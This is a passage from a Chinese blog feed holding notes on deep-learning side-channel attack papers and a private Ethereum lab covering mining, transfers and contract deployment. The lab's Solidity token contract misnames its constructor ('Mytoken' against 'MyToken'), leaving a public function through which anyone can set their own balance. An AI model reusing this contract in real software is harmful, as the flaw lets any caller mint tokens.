style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"></span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5149em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>  对于AES算法,N在这里需要等于2,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>ϕ</mi></msub></mrow><annotation encoding="application/x-tex">n_{\phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>=8,对第一种标记方法,一组标签具体为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mi>E</mi><mi>S</mi><mtext>-</mtext><mi>S</mi><mi>b</mi><mi>o</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>P</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>256</mn><mo>+</mo><mi>A</mi><mi>E</mi><mi>S</mi><mtext>-</mtext><mi>S</mi><mi>B</mi><mi>o</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>P</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(AES\text{-}Sbox(P_1,K_1),256+AES\text{-}SBox(P_2,K_2))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ES</span><span class="mord text"><span class="mord">-</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">b</span><span class="mord mathnormal">o</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ES</span><span class="mord text"><span class="mord">-</span></span><span class="mord mathnormal" style="margin-right:0.05017em;">SB</span><span class="mord mathnormal">o</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span>,对于第二种标记方法,标签具体为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo>⊕</mo><mi>K</mi><mo separator="true">,</mo><mn>256</mn><mo>+</mo><mi>A</mi><mi>E</mi><mi>S</mi><mtext>-</mtext><mi>S</mi><mi>b</mi><mi>o</mi><mi>x</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>K</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P\oplus K, 256+AES\text{-}Sbox(P,K))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ES</span><span class="mord text"><span class="mord">-</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">b</span><span class="mord mathnormal">o</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">))</span></span></span></span>。</p>
<blockquote>
<p>这里也就是隔了2的(bit数)次方,这样俩都可以分开</p>
</blockquote>
<h3 id="方法">方法</h3>
<p>  作者生成了L条能量迹,每条能量迹有<strong>八个时间样本点</strong>,用来对应输出俩S盒的值(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>Z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Z_0, Z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>), 这里Z0,Z1是由密钥对应的字节(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">K_0,K_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)来生成的, 对数据集的划分为8-1-1, 即8成的训练集,1成验证,1成测试。 这里需要回答一个问题,那八个时间样本点是指什么?</p>
<h2 id="实验结果与对比分析">实验结果与对比分析</h2>
<p>  可以看到在图一不同模型中,单标签训练耗时总体上来说与多标签相差不大,也就是说增加恢复密钥的字节数量并没有确定增加训练时间。</p>
<img src="../img/image-20230709165751081.png" alt="图1	不同方法的训练时间对比" style="zoom:67%;" />
<p>  此外,作者又在ChipWhisperer平台上做了一些测试,选取8w条能量迹做训练,1w验证集,1w测试集,分别做了四组对照,1. 未做防护 2. 掩码 3. 掩码和时钟抖动 4.掩码和打乱, 抖动是随机将能量迹右移0-20的距离, 用来模拟未对齐的能量迹, 猜测熵收敛曲线如图2所示,训练耗时如图3所示,这里可以看出多字节的训练方法要比单字节的训练时间短。</p>
<img src="../img/image-20230709210905362.png" alt="图2	不同对抗措施的猜测熵收敛曲线" style="zoom: 50%;" />
<img src="../img/image-20230709211024300.png" alt="图3	单标签与多标签训练时间差异" style="zoom:67%;" />
<p>  缩短了时间,是否能保证攻击的效果?图4可以看出最后的攻击结果是一致的,即多字节猜测熵收敛曲线与单字节曲线相匹配, 这里其实<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">K_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是效果稍微差一点,但确实收敛曲线的走势都是一样的,最后在100个epoch后排名相差不大。</p>
<img src="../img/image-20230709211920039.png" alt="图4	攻击效果" style="zoom:67%;" />
<h3 id="DPAv2">DPAv2</h3>
<p>   在DPAv2数据集上的训练时间以及训练效果的表现如图5、图6所示。</p>
<img src="../img/image-20230709212607244.png" alt="图5	DPAv2训练时间对比" style="zoom:67%;" />
<img src="../img/image-20230709213837929.png" alt="图6	DPAv2上的猜测熵收敛曲线" style="zoom:67%;" />
<h1>总结</h1>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Qian Guo, Vincent Grosso, and François-Xavier Standaert. Modeling soft analytical side-channel attacks from a coding theory viewpoint. IACR Cryptology ePrint Archive, 2018:498, 2018. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>多标签</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-AutoPOI: automated points of interest selection for side-channel analysis</title>
    <url>/archives/e366993f.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Mick G. D. Remmerswaal<sup>1</sup> · Lichao Wu<sup>2</sup> · Sébastien Tiran<sup>3</sup> · Nele Mentens<sup>1,4</sup></strong></p>
</li>
<li>
<p>单位：<strong>1 Leiden University, Leiden, The Netherlands<br>
2 Delft University of Technology, The Netherlands<br>
3 Delft, The Netherlands<br>
4 KU Leuven, Leuven, Belgium</strong></p>
</li>
<li>
<p>出处：<strong>Journal of Cryptographic Engineering</strong></p>
</li>
<li>
<p>标题：<strong>AutoPOI: automated points of interest selection for side-channel analysis</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<h2 id="研究背景">研究背景</h2>
<h2 id="文章思路">文章思路</h2>
<p>本文提出了一种基于近端策略优化方法的强化学习框架，用于自动查找、选择、缩小兴趣点，大致框架如图1所示。</p>
<img src="../img/image-20241016085031980.png" alt="图1  框架图" style="zoom:50%;" />
<p>在图1中，框架分为三部分，分别对应兴趣点区间的选择、三元组网络训练、提取Embeddings。在阶段一中，从给出能量迹中选择出多个有用的兴趣点区间。第二阶段选择一个优化过后的神经网络架构，在第三阶段通过这个网络从所选择的区间提取Embeddings，以此来完成攻击。</p>
<h2 id="阶段1：兴趣点选择">阶段1：兴趣点选择</h2>
<p>该部分负责选择出相对有用的兴趣点区间，</p>
]]></content>
      <tags>
        <tag>兴趣点选择</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Study of Deep Learning Techniques for Side-Channel Analysis and Introduction to ASCAD Database</title>
    <url>/archives/c9076169.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Ryad Benadjila, Emmanuel Prouff, Rémi Strullu, Eleonora Cagli and Cécile Dumas</strong></p>
</li>
<li>
<p>单位：<strong>CEA, LETI, MINATEC Campus, F-38054 Grenoble, France</strong></p>
</li>
<li>
<p>出处：<strong>ePrint</strong></p>
</li>
<li>
<p>标题：<strong>Study of Deep Learning Techniques for Side-Channel Analysis and Introduction to ASCAD Database</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<p>这篇论文属于是入门必读了，了解深度学习结合侧信道要做什么，先从该论文入手最好。</p>
<h2 id="背景">背景</h2>
<p>在当时将侧信道攻击与传统机器学习相结合，已经被证实相较于模板攻击有许多优势，但超参数的设计往往被保密，造成了论文中的方法以及结果不可复现。</p>
<h2 id="目的及方法">目的及方法</h2>
<p>为了解决上述问题，作者将自己分析到的AES能量迹数据集公开（ASCAD），并且解决了在该数据集上CNN、MLP模型的超参数选择问题以及模型评估指标。</p>
<h3 id="评估指标">评估指标</h3>
<table>
<thead>
<tr>
<th>指标</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>秩函数</td>
<td></td>
</tr>
<tr>
<td>准确性</td>
<td></td>
</tr>
<tr>
<td>计算时间</td>
<td>-</td>
</tr>
</tbody>
</table>
<h4 id="秩函数">秩函数</h4>
<h4 id="十折交叉验证">十折交叉验证</h4>
<p><a href="https://i4mhmh.cn/archives/undefined.html">https://i4mhmh.cn/archives/undefined.html</a></p>
<h3 id="ASCAD">ASCAD</h3>
<blockquote>
<p>数据集：<a href="https://i4mhmh.cn/archives/5dad75f5.html#%E5%AE%9E%E9%AA%8C%E4%B8%8E%E7%BB%93%E6%9E%9C">https://i4mhmh.cn/archives/5dad75f5.html#实验与结果</a></p>
</blockquote>
<p>具体数据集采集工作暂不去研究，以后应该也不会补。</p>
<p>作者将此数据集打包为h5格式，调用数据的时候最好将其中的数据打包为np或tf的格式。数据集解压后分为三个主目录，每个不同设备上采集的数据集的结构均为<code>Profiling_traces</code>与<code>Attack_traces</code>两个索引，每个索引下存放三个小数据集<code>traces</code>、<code>label</code>、<code>metadata</code></p>
<h3 id="MLP">MLP</h3>
<blockquote>
<p>Url:</p>
</blockquote>
<table>
<thead>
<tr>
<th>模型</th>
<th>数值</th>
</tr>
</thead>
<tbody>
<tr>
<td>层数</td>
<td>6</td>
</tr>
<tr>
<td>神经元</td>
<td>200</td>
</tr>
<tr>
<td>激活函数</td>
<td>ReLU</td>
</tr>
<tr>
<td>优化器</td>
<td>RMSProp</td>
</tr>
<tr>
<td><strong>超参数</strong></td>
<td>-</td>
</tr>
<tr>
<td>学习率</td>
<td>0.00001</td>
</tr>
<tr>
<td>epochs -&gt; batch</td>
<td>-</td>
</tr>
</tbody>
</table>
<p>如图一所示，在其他条件不变的情况下，对epoch的次数对结mean rank（MR）的影响进行研究，发现在epoch等于一千的时候，无论是多少次迭代，都无明显的收敛效果（红框所示），这里作者表述实验时800以上就是此效果，~说明小批量学习在此模型中的表现欠佳~ 什么也说明不了，只能说给epochs设定了一个上限 。这里params data len（pdl）是能量迹的条数参数化表示，不同epoch的pdl不同，目的是为了保证最后运行的时间相同。</p>
<p><img src="../img/image-20230410113135464.png" alt="图1 batchSize大小与MR的关系图"></p>
<p>之后作者去搜索epoch与batchSize的最佳平衡参数，给出的结果表明在<strong>epochs=400，batch size=100</strong>时平均秩函数的收敛效果最好。</p>
<img src="../img/image-20230410115336699.png" alt="图2 不同epochs与batch size的MR结果" style="zoom:67%;" />
<p>在相同条件下，作者测试了Adadeita、Adagrad、Adam、RMSprop、SGD等优化器对MR的影响，发现<strong>RMSprop</strong>优化器的效果最佳，结果如图3所示。</p>
<img src="../img/image-20230410220936467.png" alt="图3 不同优化器对MR的影响" style="zoom:67%;" />
<p>之后作者调整不同的学习率来寻求最优收敛，发现<strong>1e-05</strong>的效果最佳，结果如图4所示。</p>
<img src="../img/image-20230410221316536.png" alt="图4 不同的学习率对MR的影响" style="zoom:67%;" />
<p>关于MLP的层数，作者选择3、4、5、6、7、8、11来对比，结果显示MLP层数为<strong>6</strong>的时候精度较高，如图5所示。</p>
<p><img src="../img/image-20230410221735231.png" alt="图5 layers数量对MR以及准确率的影响"></p>
<p>作者关于每层的神经元个数做了对比实验，发现当神经元个数大于200时，准确性会有波动且训练时间会增加，如图6所示。</p>
<p><img src="../img/image-20230410222241338.png" alt="图6 神经元个数对性能的影响"></p>
<p>最后作者讨论了激活函数对于模型性能的影响，作者挑选了<em>ReLU、tanh、softplus、softmax、softsign、sigmoid、lnear、hard_sigmoid</em>等激活函数，最后这里作者说明ReLU函数的结果较好且相较于其他激活函数的训练时间最短。结果如图7所示。</p>
<img src="../img/image-20230410222712420.png" alt="image-20230410222712420" style="zoom:80%;" />
]]></content>
      <tags>
        <tag>综述</tag>
      </tags>
  </entry>
  <entry>
    <title>AES算法流程记录及初步实现</title>
    <url>/archives/4cf0e181.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c369b4d81eee9fe2cc326f4aaa28f4be20abc7798ca802cb0da90c0a46f6626c">ee733bf2dd71e66968255e3fc5c69a3c308314834dbf000bb6947d06c1052fc039983a1311a9230c2d6208b40e786ec7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>算法过程分析</category>
      </categories>
      <tags>
        <tag>分组密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链实验</title>
    <url>/archives/46fcdc31.html</url>
    <content><![CDATA[<h1>挖矿实验</h1>
<p>在环境装好之后，<code>shell</code>里使用<code>geth console</code>命令可以进入控制台</p>
<p><img src="../img/image-20230315164228584.png" alt="image-20230315164228584"></p>
<h2 id="创建用户">创建用户</h2>
<p>这里可以在控制台外创建，Windows新版本的geth不支持默认开启Person，而挖矿需要指定一个账户地址，作为挖矿账户。</p>
<p><code>geth account new </code> 随后输入两次密码</p>
<p><img src="../img/image-20230315165044485.png" alt="image-20230315165044485"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --datadir data console #进入控制台 这里data是之前存放配置的目录</span><br><span class="line">eth.accounts	# 查看所有账户</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230315165355895.png" alt="image-20230315165355895"></p>
<p>为了后续演示方便再按照以上步骤创建一个账户</p>
<p><img src="../img/image-20230315165828532.png" alt="image-20230315165828532"></p>
<p><strong>!!! 以下操作在控制台内执行</strong></p>
<p><strong>!!! 以下操作在控制台内执行</strong></p>
<p><strong>!!! 以下操作在控制台内执行</strong></p>
<h2 id="指定默认挖矿账户">指定默认挖矿账户</h2>
<p><code>eth.coinbase</code>查看挖矿账户</p>
<p><img src="../img/image-20230315165454634.png" alt="image-20230315165454634"></p>
<p>默认账户为第一个，若要修改在控制台中输入</p>
<p><code>miner.setEtherbase(eth.accounts[N])</code> N为账户列表中第N个地址的索引</p>
<p><img src="../img/image-20230315165950713.png" alt="image-20230315165950713"></p>
<p><img src="../img/image-20230315170111545.png" alt="image-20230315170111545"></p>
<p>可知挖矿账户地址已修改</p>
<h2 id="挖矿">挖矿</h2>
<p><code>miner.start(N)</code> N为开启的线程数</p>
<p><img src="../img/image-20230315170608363.png" alt="image-20230315170608363"></p>
<p>查看账户余额</p>
<p><img src="../img/image-20230315170943537.png" alt="image-20230315170943537"></p>
<blockquote>
<p>这里2.496e+21的单位是Wei 换算成以太币为2496</p>
</blockquote>
<p><img src="../img/image-20230315171145960.png" alt="image-20230315171145960"></p>
<p><code>eth.blockNumber</code>查看区块的高度</p>
<p><img src="../img/image-20230315171225257.png" alt="image-20230315171225257"></p>
<p><code>miner.stop()</code> 结束挖矿</p>
<p><img src="../img/image-20230315170904548.png" alt="image-20230315170904548"></p>
<h1>远程接入节点</h1>
<blockquote>
<p>重新初始化节点</p>
</blockquote>
<h2 id="初始化节点">初始化节点</h2>
<p><code>geth init --datadir data1 genesis.json</code></p>
<p><code>geth init --datadir data2 genesis.json</code></p>
<img src="../img/image-20230323103846345.png" alt="image-20230323103846345" style="zoom:67%;" />
<p>在data1节点中新建用户<code>geth --datadir data1 account new</code></p>
<p>在data2节点中新建用户<code>geth --datadir data2 account new</code></p>
<p>输入两次密码后创建成功</p>
<h2 id="启动节点1">启动节点1</h2>
<p><code>geth --datadir data1 --networkid &lt;your-networkid&gt; console</code> 进入控制台</p>
<p><img src="../img/image-20230323104243055.png" alt="image-20230323104243055"></p>
<p><code>admin.nodeInfo</code>查看节点信息</p>
<p><img src="../img/image-20230323104349786.png" alt="image-20230323104349786"></p>
<p>启动节点2</p>
<p><code>geth --datadir data2 --port 30306 --authrpc.port 8555 --networkid 415415 --bootnodes &lt;your-enode-data-in-red-frame&gt; console</code></p>
<p>Example <code>geth --datadir data2 --port 30306 --authrpc.port 8555 --networkid 415415 --bootnodes enode://bae50306ebf476da66590cb099ab21a345e5977fe6599805042e3ca705a255205e01b79066f818810634f783e75c5bf5f0f4d2e7b14a53990cb994e54192812e@127.0.0.1:30303 console</code></p>
<p>这里127.0.0.1是本地 <strong>局域网注意修改</strong></p>
<h2 id="查看peers">查看peers</h2>
<p><img src="../img/image-20230323105924006.png" alt="image-20230323105924006"></p>
<p><code>admin.peers</code>查看是否已经接入</p>
<h2 id="交易">交易</h2>
<p>查询初始化创建的账户余额：<code>eth.getBalance(eth.accounts[0])</code></p>
<p><img src="../img/image-20230323110115644.png" alt="image-20230323110115644"></p>
<p>挖矿<code>miner.start(1)</code></p>
<p><img src="../img/image-20230323110252778.png" alt="image-20230323110252778"></p>
<p>可以看到私链接入后，挖出区块同步信息。</p>
<p><code>miner.stop()</code>停止挖矿</p>
<p><code>eth.getBalance(eth.accounts[0])</code>查看余额</p>
<p><img src="../img/image-20230323111048689.png" alt="image-20230323111048689"></p>
<p><strong>data2节点</strong></p>
<p><code>eth.accounts[0]</code>查看账户</p>
<p><img src="../img/image-20230323111326235.png" alt="image-20230323111326235"></p>
<p><code>eth.getBalance(eth.accounts[0])</code>查看余额</p>
<p><img src="../img/image-20230323111416664.png" alt="image-20230323111416664"></p>
<h2 id="转账">转账</h2>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">personal.unlockAccount(eth.accounts[0]) # 转账前需要解锁账户</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230323111810100.png" alt="image-20230323111810100"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">eth.sendTransaction(&#123;</span><br><span class="line">to:&quot;0xb37093d46529a0d671e4e2507289195d9b6333a6&quot;,	#转入的账户</span><br><span class="line">from: eth.accounts[0],														#转出的账户</span><br><span class="line">value: 66666																			#Wei数量</span><br><span class="line">&#125;);	</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230323111833862.png" alt="image-20230323111833862"></p>
<p><code>txpool.status</code>查看交易池</p>
<p><img src="../img/image-20230323112014659.png" alt="image-20230323112014659"></p>
<p>可知刚才提交的交易还并未处理，需要有人挖到一个区块后，在区块中加入这次的转账交易。</p>
<p>Data1 中<code>miner.start(1)</code></p>
<p>Data2中<code>eth.getBalance(eth.accounts[0])</code></p>
<p><img src="../img/image-20230323112444710.png" alt="image-20230323112444710"></p>
<p><a href="https://blog.csdn.net/m0_46316967/article/details/126297134">https://blog.csdn.net/m0_46316967/article/details/126297134</a></p>
<h1>智能合约部署</h1>
<h2 id="合约编写">合约编写</h2>
<blockquote>
<p>url： <a href="http://remix.ethereum.org/">http://remix.ethereum.org/</a></p>
</blockquote>
<ul>
<li>tests目录下新建demo.sol文件</li>
</ul>
<p><img src="../img/image-20230409145654365.png" alt="demo"></p>
<ul>
<li>代码如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: SimPL-2.0</span><br><span class="line">pragma solidity &gt;= 0.4.22 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract MyToken&#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line">    function Mytoken(uint256 initialSupply) public &#123;</span><br><span class="line">        balanceOf[msg.sender] = initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _value);</span><br><span class="line"></span><br><span class="line">        require(balanceOf[_to] + _value &gt;= balanceOf[_to]);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= _value;</span><br><span class="line"></span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>编译合约</li>
</ul>
<p><img src="../img/image-20230409145909011.png" alt=""></p>
<p>通过以下网站将ABI压缩为单行</p>
<p><a href="http://www.bejson.com/">http://www.bejson.com/</a></p>
<h2 id="部署合约">部署合约</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转义abi</span></span><br><span class="line">abi = JSON.parse(<span class="string">&#x27;input your ABI json here&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409150441310.png" alt="ABI"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 赋值</span></span><br><span class="line">myContract = web3.eth.contract(abi)</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409150702254.png" alt="赋值"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 预估手续费</span></span><br><span class="line">bytecode = <span class="string">&#x27;0x input your byte here&#x27;</span></span><br><span class="line">web3.eth.estimateGas(&#123;data: bytecode&#125;)</span><br></pre></td></tr></table></figure>
<img src="../img/image-20230409150843222.png" alt="预估手续费" style="zoom:67%;" />
